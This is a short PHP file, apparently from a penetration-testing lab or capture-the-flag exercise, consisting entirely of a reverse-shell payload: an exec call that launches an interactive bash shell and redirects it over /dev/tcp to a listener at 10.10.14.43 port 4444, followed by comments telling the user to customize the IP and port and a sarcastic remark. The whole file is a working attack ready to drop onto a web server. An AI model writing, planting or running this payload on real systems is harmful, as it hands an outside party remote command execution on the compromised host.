<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.43/4444 0<&1 2>&1'");
// Customize the IP and Port
//  ^??? how do you mess this up?
?>